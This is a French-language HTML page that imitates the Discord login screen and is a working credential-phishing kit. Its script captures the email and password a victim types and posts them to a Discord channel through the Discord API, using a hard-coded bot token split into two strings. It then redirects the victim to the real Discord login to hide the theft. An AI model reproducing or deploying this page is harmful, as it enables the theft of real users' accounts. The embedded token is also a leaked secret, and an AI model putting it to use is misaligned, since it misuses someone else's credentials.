<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #313338; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #2b2d31; padding: 32px; border-radius: 8px; text-align: center; width: 350px; }
        input { width: 100%; padding: 12px; margin: 10px 0; background-color: #1e1f22; border: none; border-radius: 4px; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #status { margin-top: 15px; font-size: 14px; color: #00ff00; }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size: 24px; font-weight: bold; margin-bottom: 20px;">Bienvenue à nouveau!</div>
        <form id="loginForm">
            <input type="email" id="email" placeholder="E-mail" required>
            <input type="password" id="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <div id="status"></div>
    </div>

    <script>
        // TES INFOS ICI
        const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
        const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
        const botToken = part1 + part2;
        const channelId = "1566474880894116032";

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const statusDiv = document.getElementById('status');
            statusDiv.style.color = "#ffff00"; // jaune
            statusDiv.innerText = "Envoi en cours...";
            
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const msg = `**Login Discord**\n**Email:** ${email}\n**Pass:** ${pass}`;

            try {
                let res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
                    method: 'POST',
                    headers: { 
                        'Authorization': `Bot ${botToken}`, 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({ content: msg })
                });
                
                let data = await res.json();
                
                if (res.ok) {
                    statusDiv.style.color = "#00ff00"; // vert
                    statusDiv.innerText = "Réussi ! Regarde ton discord.";
                    setTimeout(() => { window.location.href = "https://discord.com/login"; }, 1500);
                } else {
                    statusDiv.style.color = "#ff0000"; // rouge
                    statusDiv.innerText = "Erreur token: " + data.message;
                }
            } catch (err) {
                statusDiv.style.color = "#ff0000";
                statusDiv.innerText = "Erreur réseau: " + err.message;
            }
        });
    </script>
</body>
</html>
